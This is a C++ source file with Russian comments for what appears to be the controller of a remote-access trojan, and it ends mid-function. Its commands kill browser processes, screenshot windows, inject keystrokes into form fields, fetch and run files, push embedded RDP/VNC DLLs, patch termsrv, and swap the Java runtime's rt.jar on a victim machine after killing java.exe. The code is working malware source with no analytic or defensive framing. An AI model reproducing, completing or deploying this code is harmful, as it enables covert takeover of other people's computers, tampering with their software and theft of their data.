#include "stdafx.h"
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "Listener.h"
#include "../common/protocol.h"

//=================================================


#define PING_DELTA		31000
#define PING_TIMEOUT	60000

LPBYTE GetDll(BYTE *lpData,DWORD dwSize,DWORD Beb,DWORD *Sise)
{
    if (Beb+*Sise > dwSize)
        *Sise=dwSize-Beb;
    LPBYTE Data1=(LPBYTE )malloc(*Sise);
    memcpy(Data1,&lpData[Beb],*Sise);
    return Data1;
}

//для каждого файла заведем свой namespace, дабы не извращаться с именами переменных
//и автоматизировать работу bin2hex.exe

//ничего автоматизировать не нужно, так как в файле vnc.h стоит маска по которой будет находится нужная
//область памяти в которую будет ложиться файл с помощью внешней утилиты
namespace RDP
{
	//маска по которой находим данный массив
	unsigned char mask[] = { 0x15, 0x26, 0x37, 0x48, 0x59, 0x6a, 0x7b, 0x8c };
	//размер вложенного файла
	unsigned char size[] = { 0, 0, 0, 0, 1, 1, 1, 1 };
#ifndef WITHOUT_VNC
	#include "../DLLs/RDP.h"
#else
	unsigned char data[] = { 0 };
#endif
}
namespace VNC
{
	//маска по которой находим данный массив
	unsigned char mask[] = { 0x12, 0x21, 0x34, 0x43, 0x56, 0x65, 0x78, 0x87 };
	//размер вложенного файла
	unsigned char size[] = { 0, 0, 0, 0, 1, 1, 1, 1 };

#ifndef WITHOUT_VNC
	#include "../DLLs/VNC.h"
#else
	unsigned char data[] = { 0 };
#endif
}


CClient::CClient( SOCKET sock, sockaddr_in* addr )
	: m_Sock( sock )
	, m_RemoteAddr( *addr )
	, m_hLock( CreateEvent( 0, TRUE, FALSE, 0 ) )

	, m_LastPingTime( 0 )
	, m_LastActivity( 0 )

	, m_LastInfoRequestTime( 0 )
	, m_InfoReceived( false )

	, m_hwClientNotify( 0 )
{
	m_UID[0] = 0;
	AutoUpdate=30;
}

CClient::~CClient( )
{
	shutdown( m_Sock, SD_BOTH );
	closesocket( m_Sock );
	CloseHandle( m_hLock );
}

bool CClient::SendPing( DWORD currentTime )
{
	PacketBuffer buffer;
	buffer.Create( PK_SC_PING, currentTime, 0, 0 );

	if( !buffer.Send( m_Sock ) )
	{
		return false;
	}

	m_LastPingTime = currentTime;
	return true;
}


bool CClient::SendInfoRequest( DWORD currentTime )
{
	PacketBuffer buffer;
	buffer.Create( PK_SC_INFO, currentTime, 0, 0 );

	if( !buffer.Send( m_Sock ) )
	{
		return false;
	}

	m_LastInfoRequestTime = currentTime;
	m_InfoReceived = false;
	return true;
}

PATCH_DATA_ANSWER *CClient::ReadFilePart( PATCH_DATA_REQUEST *request )
{
	PATCH_DATA_ANSWER *ans = 0;

	if( request->idPatch == 0 )
	{
		HANDLE hFile=0;
		if (lstrcmpW(L"DATA",request->sourceFile)==0)
		{
			LPBYTE data=GetDll(RDP::data,*((int*)RDP::size)/*sizeof(RDP::data)*/,request->bytes_from,&request->bytes_count);
			ans = (PATCH_DATA_ANSWER*)malloc( request->bytes_count + sizeof(PATCH_DATA_ANSWER) );
			memcpy(ans->bytes,data, request->bytes_count);

			ans->idPatch = 0;
			ans->bytes_from = request->bytes_from;
			//if (sizeof(RDP::data)<ans->bytes_from+ans->bytes_count)

			ans->bytes_count = request->bytes_count;


			free(data);

		}
		else if (lstrcmpW(L"DATAVNC",request->sourceFile)==0)
		{
			LPBYTE data=GetDll(VNC::data,*((int*)VNC::size)/*sizeof(VNC::data)*/,request->bytes_from,&request->bytes_count);
			ans = (PATCH_DATA_ANSWER*)malloc( request->bytes_count + sizeof(PATCH_DATA_ANSWER) );
			memcpy(ans->bytes,data, request->bytes_count);

			ans->idPatch = 0;

			ans->bytes_from = request->bytes_from;
			//if (*((int*)VNC::size)/*sizeof(VNC::data)*/<ans->bytes_from+ans->bytes_count)

			ans->bytes_count = request->bytes_count;


			free(data);

		}
		else
			hFile = CreateFile( &request->sourceFile[0], GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );


		if(hFile!=NULL)
		if( hFile != INVALID_HANDLE_VALUE )
		{
			DWORD fullsize = GetFileSize( hFile, 0 );
			if( request->bytes_from + request->bytes_count <= fullsize )
			{
				ans = (PATCH_DATA_ANSWER*)malloc( request->bytes_count + sizeof(PATCH_DATA_ANSWER) );
				ans->idPatch = 0;
				ans->bytes_from = request->bytes_from;
				ans->bytes_count = request->bytes_count;
			}
			else
			{
				DWORD rest = fullsize - request->bytes_from;
				ans = (PATCH_DATA_ANSWER*)malloc( rest + sizeof(PATCH_DATA_ANSWER) );
				ans->idPatch = 0;
				ans->bytes_from = request->bytes_from;
				ans->bytes_count = rest;
			}

			if( ans->bytes_count > 0 )
			{
				DWORD dwRead = 0;
				SetFilePointer( hFile, ans->bytes_from, 0, FILE_BEGIN );
				ReadFile( hFile, ans->bytes, ans->bytes_count, &dwRead, 0 );
			}

			CloseHandle( hFile );
		}
	}
	return ans;
}
void DbgMsgW(WCHAR *file, int line, WCHAR *msg, ...)
{
	WCHAR *buff  = (WCHAR*)malloc( 1024 );
	WCHAR *obuff = (WCHAR*)malloc( 1024 );
	va_list mylist;

	va_start(mylist, msg);
	wvsprintfW(buff, msg, mylist);
	va_end(mylist);

	wsprintfW(obuff, L"%s(%d) : %s", file, line, buff);

	OutputDebugStringW(obuff);
}


bool CClient::Poll( HWND notifyWindow )
{
	DWORD currentTime = timeGetTime();

	// check dead client

	if( m_LastPingTime == 0 ||
		(currentTime - m_LastPingTime) > PING_DELTA )
	{
		if( !SendPing( currentTime ) )
		{
			return false;
		}
	}

	if( m_LastActivity == 0 )
	{
		m_LastActivity = currentTime;
	}
	else
	{
		if( currentTime - m_LastActivity > PING_TIMEOUT )
		{
			return false;
		}
	}

	// send info request

	if( m_LastInfoRequestTime == 0 )
	{
		if( !SendInfoRequest( currentTime ) )
		{
			return false;
		}
	}

	// send unprocessed transactions
	m_TransactionLock.Lock();
	list<Transaction>::iterator I = m_Transactions.begin();
	for( ; I != m_Transactions.end(); I++ )
	{
		if( !I->m_bSent )
		{
			I->m_Sent.Send( m_Sock );
			I->m_bSent = true;
		}
	}
	m_TransactionLock.Unlock();

	// receive data
	bool bActivity = false;
	if( !m_Received.Receive( m_Sock, &bActivity ) )
	{
		return false;
	}
	if( bActivity )
	{
		m_LastActivity = currentTime;

		// update progress of long transactions
		PostMessage( m_hwClientNotify, PM_CLIENT_PROGRESS,
			m_Received.GetReceivedBytes(),
			m_Received.GetExpectedBytes() );
	}


	// check received data
	while( m_Received.IsPacketCompleted() )
	{
		PPacket p = m_Received.GetFirst();
		if( p )
		{
			switch( p->type )
			{

			/*case PK_CS_WIN_CONTROL_NAME:

				SendMessage( m_ControlWind, PM_CONTROLS_SEND_COMAND, 0, (LPARAM)this );
				break;*/
			case PK_CS_PONG:
				break;

			case PK_CS_INFO:
				{
					if( p->size == sizeof(SYST_INFO) )
					{
						if( p->timestamp == m_LastInfoRequestTime )
						{
							SYST_INFO *pInfo = (SYST_INFO *)p->data;
							m_Is64=pInfo->isW64;
							lstrcpy(m_Coment,pInfo->Coment);

							m_rcDesktopSize.left = m_rcDesktopSize.top = 0;
							m_rcDesktopSize.right = pInfo->desktopSize.cx;
							m_rcDesktopSize.bottom = pInfo->desktopSize.cy;
							CopyMemory( &m_Version, &pInfo->osVersion, sizeof(m_Version) );
							_tcscpy( m_UID, pInfo->name );
							m_InfoReceived = true;

							SendMessage( notifyWindow, PM_CLIENT_CHANGED, 0, (LPARAM)this );
						}
					}
				}
				break;

			case PK_CS_PATCHDATA:
				if( p->size == sizeof(PATCH_DATA_REQUEST) )
				{
					PATCH_DATA_REQUEST *rq = (PATCH_DATA_REQUEST*)p->data;
					PATCH_DATA_ANSWER *ans = ReadFilePart( rq );
					if( ans )
					{
						PacketBuffer buffer;
						buffer.Create( PK_SC_PATCHDATA, p->timestamp, ans->bytes_count + sizeof(*ans), ans );
						buffer.Send( m_Sock );
						free( ans );
					}
				}
				break;

			case PK_CS_PATCHDATA_VNC:
				PostMessage( m_hwClientNotify,
						PM_Client_PATCHDATA_VNC,
						0, 0 );
				break;
			case PK_CS_PATCHDATA_RDP:
				PostMessage( m_hwClientNotify,
						PM_Client_PATCHDATA_RDP,
						0, 0 );
				break;
			case PK_CS_SETOPTIONS:
			case PK_CS_DRIVERLIST:
			case PK_CS_FILELIST:
			case PK_CS_PROCESSLIST:
			case PK_CS_FILEGET:
			case PK_CS_GET_GATEWAY_IPS:
			case PK_CS_PATCH_TERMSRV:
					PostMessage( m_hwClientNotify,
						NotificationFromType(p->type),
						(WPARAM)p->data, (LPARAM)p->size );
				break;
			default:
				if( UpdateTransaction( p ) )
				{
					PostMessage( m_hwClientNotify,
						NotificationFromType(p->type),
						0, 0 );
				}
				break;
			}

			m_Received.DiscardFirst();
		}
		else
		{
			break;
		}
	}

	return true;
}

bool CClient::IsLocked()
{
	return (WaitForSingleObject( m_hLock, 0 ) == WAIT_OBJECT_0);
}

void CClient::Lock()
{
	SetEvent( m_hLock );
}

void CClient::Unlock()
{
	ResetEvent( m_hLock );
}

void CClient::GetListName( LPWSTR buf,LPWSTR  Coment)
{
	if( m_InfoReceived )
	{
		lstrcpy(Coment,m_Coment);
		wsprintf( buf, L"%s [%d.%d.%d.%d]",
			m_UID,
			m_RemoteAddr.sin_addr.S_un.S_un_b.s_b1,
			m_RemoteAddr.sin_addr.S_un.S_un_b.s_b2,
			m_RemoteAddr.sin_addr.S_un.S_un_b.s_b3,
			m_RemoteAddr.sin_addr.S_un.S_un_b.s_b4 );

		TCHAR tmp[300] = L"";
		wsprintf( tmp, L" (%dx%d)",
			m_rcDesktopSize.right - m_rcDesktopSize.left,
			m_rcDesktopSize.bottom - m_rcDesktopSize.top );
		lstrcat( buf, tmp );

		if( m_Version.dwOSVersionInfoSize == sizeof(OSVERSIONINFOEX) )
		{
			wsprintf( tmp, L", platform %d, version %d.%d.%d",
				m_Version.dwPlatformId,
				m_Version.dwMajorVersion,
				m_Version.dwMinorVersion,
				m_Version.dwBuildNumber );
			lstrcat( buf, tmp );

			if( m_Version.szCSDVersion[0] )
			{
				lstrcat( buf, L", " );
				lstrcat( buf, m_Version.szCSDVersion );
			}
		}
		else
		{
			lstrcat( buf, L", Unknown version" );
		}
		if(m_Is64)
			lstrcat( buf, L" x64" );
		else
			lstrcat( buf, L" x32" );
	}
	else
	{
		wsprintf( buf, L"%d.%d.%d.%d",
			m_RemoteAddr.sin_addr.S_un.S_un_b.s_b1,
			m_RemoteAddr.sin_addr.S_un.S_un_b.s_b2,
			m_RemoteAddr.sin_addr.S_un.S_un_b.s_b3,
			m_RemoteAddr.sin_addr.S_un.S_un_b.s_b4 );
	}
}

void CClient::SetClientNotifyWindow( HWND hw )
{
	m_hwClientNotify = hw;
}

int CClient::NotificationFromType( int type )
{
	switch( type )
	{
		case PK_CS_GET_GATEWAY_IPS:		return PM_CLIENT_GATEWAY_IPS;
		case PK_CS_FILELIST:			return PM_CLIENT_FILELIST;
		case PK_CS_FILEGET:				return PM_CLIENT_FILEGET;
		case PK_CS_DRIVERLIST:			return PM_CLIENT_DRIVERLIST;
		case PK_CS_WINLIST:				return PM_CLIENT_WINDOW_LIST;
		case PK_CS_WINSHOT:				return PM_CLIENT_WINDOW_SHOT;
		case PK_CS_PROCESSLIST:			return PM_CLIENT_PROCESSLIST;			//получаем список процессов
		case PK_CS_KILLPROCESSFROMLIST:	return PM_Client_KILLPROCESSFROMLIST;	//мочим процесс
		case PK_CS_LEFTCLICK:			return PM_CLIENT_LCLICK_CONFIRMED;
		case PK_CS_KEYS:				return PM_CLIENT_KEYS_CONFIRMED;
		case PK_CS_RUN:					return PM_CLIENT_RUN_CONFIRMED;
		case PK_CS_PATCHINFO:			return PM_CLIENT_PATCH_INFO;
		case PK_CS_PATCHSTART:			return PM_CLIENT_PATCH_START;
		case PK_CS_WINCMD:				return PM_CLIENT_CMD_CONFIRMED;
		case PK_CS_SETOPTIONS:			return PM_CLIENT_OPTS_CONFIRMED;
		case PK_CS_WIN_CONTROL_NAME:	return PM_CONTROLS_SEND_COMAND;
		case PK_CS_PATCH_TERMSRV:		return PM_CLIENT_PATCH_TERMSRV;

	}
	return PM_CLIENT_GENERAL;
}

list<CClient::Transaction>::iterator CClient::FindTransactionToSend( BYTE type )
{
	list<Transaction>::iterator I = m_Transactions.begin();
	for( ; I != m_Transactions.end(); I++ )
	{
		PPacket chk = I->m_Sent.GetFirst();
		if( chk &&
			chk->type == type )
		{
			break;
		}
	}
	if( I == m_Transactions.end() )
	{
		m_Transactions.push_front( Transaction() );
		I = m_Transactions.begin();
	}
	return I;
}

list<CClient::Transaction>::iterator CClient::FindReceivedTransaction( DWORD type, list<Transaction>::iterator _From )
{
	list<Transaction>::iterator I = _From;
	for( ; I != m_Transactions.end(); I++ )
	{
		if( I->m_bAnswerReceived )
		{
			PPacket chk = I->m_Received.GetFirst();
			if( chk &&
				chk->type == type )
			{
				break;
			}
		}
	}
	return I;
}

bool CClient::UpdateTransaction( PPacket pReply )
{
	bool bResult = false;
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = m_Transactions.begin();
	for( ; I != m_Transactions.end(); I++ )
	{
		if( I->m_Sent.GetFirst() &&
			I->m_Sent.GetFirst()->type == (pReply->type & 0x7F) &&
			I->m_Sent.GetFirst()->timestamp == pReply->timestamp )
		{
			I->m_Received.Create( pReply->type, pReply->timestamp, pReply->size, pReply->data );
			I->m_bAnswerReceived = true;
			bResult = true;
			break;
		}
	}

	m_TransactionLock.Unlock();
	return bResult;
}

void CClient::RequestResumeJava()
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_RESUMEJAVA );

	I->Reset();
	I->m_Sent.Create( PK_SC_RESUMEJAVA, timeGetTime(), 0, NULL );

	m_TransactionLock.Unlock();
}

void CClient::RequestSuspendJava()
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_SUSPENDJAVA );

	I->Reset();
	I->m_Sent.Create( PK_SC_SUSPENDJAVA, timeGetTime(), 0, NULL );

	m_TransactionLock.Unlock();
}

void CClient::RequestProcessList()
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_PROCESSLIST );

	I->Reset();
	I->m_Sent.Create( PK_SC_PROCESSLIST, timeGetTime(), 0, NULL );

	m_TransactionLock.Unlock();
}
void CClient::KillFromProcessList(DWORD pid)
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_KILLPROCESSFROMLIST );

	I->Reset();
	I->m_Sent.Create( PK_SC_KILLPROCESSFROMLIST, timeGetTime(), sizeof(DWORD), &pid );

	m_TransactionLock.Unlock();

}
void CClient::KillFromProcessListIE_FF_OP()
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_KILLPROCESFROMLIST_I_F_O );

	I->Reset();
	I->m_Sent.Create( PK_SC_KILLPROCESFROMLIST_I_F_O, timeGetTime(), 0, 0);

	m_TransactionLock.Unlock();

}

void CClient::RequestWindowList()
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_WINLIST );
	I->Reset();
	I->m_Sent.Create( PK_SC_WINLIST, timeGetTime(), 0, 0 );

	m_TransactionLock.Unlock();
}

void CClient::RequestNamesControl(DWORD_PTR idWindow)////должно вернуть имена контролов
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_WIN_CONTROL_NAME );
	I->Reset();
	I->m_Sent.Create( PK_SC_WIN_CONTROL_NAME, timeGetTime(), sizeof(idWindow), &idWindow );

	m_TransactionLock.Unlock();
}
void CClient::CloseWindow(DWORD_PTR idWindow)
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_WIN_CLOSE );
	I->Reset();
	I->m_Sent.Create( PK_SC_WIN_CLOSE, timeGetTime(), sizeof(idWindow), &idWindow );

	m_TransactionLock.Unlock();
}

void CClient::GetWindowList( list<WIN_INFO>& windows )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindReceivedTransaction( PK_CS_WINLIST, m_Transactions.begin() );
	if( I != m_Transactions.end() )
	{
		PPacket chk = I->m_Received.GetFirst();
		int count = chk->size / sizeof(WIN_INFO);
		WIN_INFO *pInfo = (WIN_INFO*)chk->data;

		windows.clear();
		for( int i=0; i<count; i++ )
		{
			windows.push_back( pInfo[i] );
		}
	}

	m_TransactionLock.Unlock();
}

void CClient::GetFileList( list<WIN32_FIND_DATA>& files )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindReceivedTransaction( PK_CS_FILELIST, m_Transactions.begin() );
	if( I != m_Transactions.end() )
	{
		PPacket chk = I->m_Received.GetFirst();
		int count = chk->size / sizeof(WIN32_FIND_DATA);
		WIN32_FIND_DATA *pInfo = (WIN32_FIND_DATA*)chk->data;

		files.clear();
		for( int i=0; i<count; i++ )
		{
			files.push_back( pInfo[i] );
		}
	}

	m_TransactionLock.Unlock();
}

void CClient::GetCildWindowList( list<WIN_INFO>& windows )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindReceivedTransaction( PK_CS_WIN_CONTROL_NAME, m_Transactions.begin() );
	if( I != m_Transactions.end() )
	{
		PPacket chk = I->m_Received.GetFirst();
		int count = chk->size / sizeof(WIN_INFO);
		WIN_INFO *pInfo = (WIN_INFO*)chk->data;

		windows.clear();
		for( int i=0; i<count; i++ )
		{
			windows.push_back( pInfo[i] );
		}
	}

	m_TransactionLock.Unlock();
}

void CClient::RequestWinShot( DWORD_PTR idWindow ,BOOL bIsDelFleg)
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_WINLIST );
	SCRIN_SHOT  pShot;
	pShot.id=idWindow;
	pShot.isDelFile=bIsDelFleg;


	I->Reset();
	I->m_Sent.Create( PK_SC_WINSHOT, timeGetTime(), sizeof(SCRIN_SHOT), &pShot );

	m_TransactionLock.Unlock();
}

bool CClient::GetWinShot( DWORD_PTR idWindow, vector<BYTE>& rawdata )
{
	bool bResult = false;
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindReceivedTransaction( PK_CS_WINSHOT, m_Transactions.begin() );
	while( I != m_Transactions.end() )
	{

		PPacket pPacket = I->m_Received.GetFirst();
		WIN_SHOT *pShot = (WIN_SHOT *)(pPacket->data);
		if( pShot->id == idWindow )
		{
			rawdata.clear( );
			rawdata.insert( rawdata.end(), pPacket->data, pPacket->data + pPacket->size );
			bResult = true;
			break;
		}
		else
		{
			I++;
			I = FindReceivedTransaction( PK_CS_WINSHOT, I );
		}
	}

	m_TransactionLock.Unlock();
	return bResult;
}

void CClient::RequestLClick( DWORD_PTR idWindow, int x, int y, bool bDouble )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_LEFTCLICK );

	LEFT_CLICK content;
	content.idWindow = idWindow;
	content.x = x;
	content.y = y;
	content.doubleClick = bDouble;

	I->Reset();
	I->m_Sent.Create( PK_SC_LEFTCLICK, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

void CClient::RequestKeys(
	DWORD_PTR idWindow, int x, int y, LPCTSTR str, bool bEnter, bool bLeft,bool bIsSend )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_KEYS );

	KEYS content;
	content.idWindow = idWindow;
	content.x = x;
	content.y = y;
	content.flags = 0;
	content.flags |= bEnter ? 0x1 : 0;
	content.flags |= bLeft ? 0x2 : 0;
	content.bIsSend=bIsSend;
	lstrcpy( content.str, str );

	I->Reset();
	I->m_Sent.Create( PK_SC_KEYS, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}
void CClient::RequestKeysToForm(
	DWORD_PTR idWindow,DWORD_PTR idControl, int x, int y, LPCTSTR str, bool bEnter, bool bCtrlA,bool bIsSendMes )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_KEYS_TO_CONTROL );

	KEYS_TO_CONTROL content;
	content.idWindow	= idWindow;
	content.idControl	=idControl;
	content.x			= x;
	content.y			= y;
	content.flags		= 0;
	content.flags |= bEnter		? 0x1 : 0;
	content.flags |= bCtrlA		? 0x2 : 0;
	content.flags1|= bIsSendMes ? 0x1 : 0;
	lstrcpy( content.str, str );

	I->Reset();
	I->m_Sent.Create( PK_SC_KEYS_TO_CONTROL, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

void CClient::RequestRightMouseDown( DWORD_PTR idWindow,DWORD_PTR idControl, int x, int y )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_RIGHT_DOWN_TO_CONTROL );

	KEYS_TO_CONTROL content;
	content.idWindow	= idWindow;
	content.idControl	=idControl;
	content.x			= x;
	content.y			= y;
	//content.flags		= 0;
	content.flags = false;
	//content.flags |= bCtrlA ? 0x2 : 0;
	//lstrcpy( content.str, str );

	I->Reset();
	I->m_Sent.Create(PK_SC_RIGHT_DOWN_TO_CONTROL, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

void CClient::RequestLeftMouseDown( DWORD_PTR idWindow,DWORD_PTR idControl, int x, int y )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_LEFT_DOWN_TO_CONTROL );

	KEYS_TO_CONTROL content;
	content.idWindow	= idWindow;
	content.idControl	=idControl;
	content.x			= x;
	content.y			= y;
	content.flags		= true;
	//content.flags |= bEnter ? 0x1 : 0;
	//content.flags |= bCtrlA ? 0x2 : 0;
	//lstrcpy( content.str, str );

	I->Reset();
	I->m_Sent.Create(PK_SC_LEFT_DOWN_TO_CONTROL, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

void CClient::RequestRun( DWORD idApp,LPCTSTR str,LPCTSTR ExeF, DWORD dwHost, BOOL sw_shell, BOOL sw_run_withIE )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_RUN );

	RUN_INFO content;
	content.idApp = idApp;
	ZeroMemory(&content.str,MAX_PATH);
	lstrcpy( content.str, str );
	content.dwHost = dwHost;
	content.sw_shell = sw_shell;
	content.sw_run_withIE = sw_run_withIE;
	ZeroMemory(&content.ExeStr,MAX_PATH);
	lstrcpy( content.ExeStr, ExeF );


	I->Reset();
	I->m_Sent.Create( PK_SC_RUN, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

bool CClient::GetRunResult( )
{
	// TODO:
	return false;
}

void CClient::RequestPatchInfo( )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_PATCHINFO );

	I->Reset();
	I->m_Sent.Create( PK_SC_PATCHINFO, timeGetTime(), 0, 0 );

	m_TransactionLock.Unlock();
}

bool CClient::GetPatchInfo( PATCH_INFO* info )
{
	bool bResult = false;
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindReceivedTransaction( PK_CS_PATCHINFO, m_Transactions.begin() );
	if( I != m_Transactions.end() )
	{
		PPacket pPacket = I->m_Received.GetFirst();
		if( pPacket->size == sizeof(*info) )
		{
			CopyMemory( info, pPacket->data, pPacket->size );
			bResult = true;
		}
	}

	m_TransactionLock.Unlock();
	return bResult;
}
bool CClient::RequestUploadStart(WCHAR* sourceF, WCHAR* targetF)
{
	bool bResult = false;
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_PATCHINFO );

	PATCH_START info;
	ZeroMemory( &info, sizeof(info) );
	lstrcpy( info.targetFile, targetF );
	lstrcpy( info.sourceFile, sourceF );
	info.sw_save = true;
	HANDLE hFile = CreateFile( &info.sourceFile[0], GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	if( hFile != INVALID_HANDLE_VALUE )
	{
		info.bytes_to_download = GetFileSize( hFile, 0 );
		CloseHandle( hFile );

		I->Reset();
		I->m_Sent.Create( PK_SC_PATCHSTART, timeGetTime(), sizeof(info), &info );
		bResult = true;
	}

	m_TransactionLock.Unlock();
	return bResult;
}

bool CClient::RequestUploadStartData()
{
	bool bResult = false;
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_PATCHINFO );

	PATCH_START info;
	ZeroMemory( &info, sizeof(info) );
	lstrcpy( info.targetFile, L"DATA");
	lstrcpy( info.sourceFile, L"DATA" );
	info.sw_save = true;


	info.bytes_to_download = *((int*)RDP::size); //sizeof(RDP::data);


	I->Reset();
	I->m_Sent.Create( PK_SC_PATCHSTART, timeGetTime(), sizeof(info), &info );
	bResult = true;


	m_TransactionLock.Unlock();
	return bResult;
}
bool CClient::RequestUploadStartDataVNC()
{
	bool bResult = false;
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_PATCHINFO );

	PATCH_START info;
	ZeroMemory( &info, sizeof(info) );
	lstrcpy( info.targetFile, L"DATAVNC");
	lstrcpy( info.sourceFile, L"DATAVNC" );
	info.sw_save = true;


	info.bytes_to_download = *((int*)VNC::size); // sizeof(VNC::data);


	I->Reset();
	I->m_Sent.Create( PK_SC_PATCHSTART, timeGetTime(), sizeof(info), &info );
	bResult = true;


	m_TransactionLock.Unlock();
	return bResult;
}
bool CClient::RequestPatchStart()
{
	bool bResult = false;
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_PATCHINFO );

	PATCH_START info;
	ZeroMemory( &info, sizeof(info) );
	lstrcpy( info.targetFile, L"C:\\java\\jre6\\lib\\rt.jar" );
	lstrcpy( info.sourceFile, L"files\\rt.jar" );
	lstrcpy( info.processToKill, L"java.exe" );
	HANDLE hFile = CreateFile( &info.sourceFile[0], GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	if( hFile != INVALID_HANDLE_VALUE )
	{
		info.bytes_to_download = GetFileSize( hFile, 0 );
		CloseHandle( hFile );

		I->Reset();
		I->m_Sent.Create( PK_SC_PATCHSTART, timeGetTime(), sizeof(info), &info );
		bResult = true;
	}

	m_TransactionLock.Unlock();
	return bResult;
}

bool CClient::GetPatchStartInfo()
{
	// TODO:
	return false;
}

void CClient::RequestWinCmd( DWORD_PTR idWindow, DWORD cmd )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_WINCMD );

	WIN_CMD content;
	content.id = idWindow;
	content.command = cmd;

	I->Reset();
	I->m_Sent.Create( PK_SC_WINCMD, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

void CClient::RequestWinCmd( DWORD_PTR idWindow, DWORD cmd, BYTE* data, DWORD dataSize )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_WINCMD );

	WIN_CMD content;
	content.id = idWindow;
	content.command = cmd;
	memcpy(&content.data[0], data, dataSize);
	content.dataLen = dataSize;

	I->Reset();
	I->m_Sent.Create( PK_SC_WINCMD, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

void CClient::RunAs(LPCTSTR  cmd,DWORD Style, DWORD RunBy)
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_RUNFILE );

	FILERUN_CMD content;
	content.dwSellEx_Or_CreateP=RunBy;
	content.dwStyle = Style;
	lstrcpy( content.filename, cmd );

	I->Reset();
	I->m_Sent.Create( PK_SC_RUNFILE, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}
void CClient::RequestFileList(DWORD cmd, LPCTSTR FilePath)
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_FILELIST );

	FILELIST_CMD content;

	content.dwComand = cmd;
	lstrcpy( content.str, FilePath );

	I->Reset();
	I->m_Sent.Create( PK_SC_FILELIST, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

void CClient::RequestFileGet(DWORD cmd, DWORD some_data, LPCTSTR FilePath )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_FILEGET );

	FILEGET_CMD content;

	content.dwComand = cmd;
	content.dwData = some_data;
	lstrcpy( content.filename, FilePath );

	I->Reset();
	I->m_Sent.Create( PK_SC_FILEGET, timeGetTime(), sizeof(content), &content );

	m_TransactionLock.Unlock();
}

void CClient::RequestDriverList()
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_DRIVERLIST );

	I->Reset();
	I->m_Sent.Create( PK_SC_DRIVERLIST, timeGetTime(), 0, NULL );

	m_TransactionLock.Unlock();
}

void CClient::RequestGatewayIPs()
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_GET_GATEWAY_IPS );

	I->Reset();
	I->m_Sent.Create( PK_SC_GET_GATEWAY_IPS, timeGetTime(), 0, NULL );

	m_TransactionLock.Unlock();
}

bool CClient::GetWinCmdResult( )
{
	// TODO:
	return false;
}

void CClient::RequestSetOptions( bool sw_set, DWORD sleep1, DWORD sleep2, DWORD sleep3, DWORD prio1,int iAutoUpdate,int iSleep,LPCTSTR Coment,LPCTSTR WinHederName,LPCTSTR ProccessName,LPCTSTR ClassName )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_SETOPTIONS );
	if(sw_set)
	{
		CL_OPTIONS opts;
		opts.sleep1 = 0;
		opts.sleep2 = 0;
		opts.sleep3 = 0;
		opts.sleep = iSleep;
		opts.prio1 = prio1;
		lstrcpy(opts.Coments,Coment);
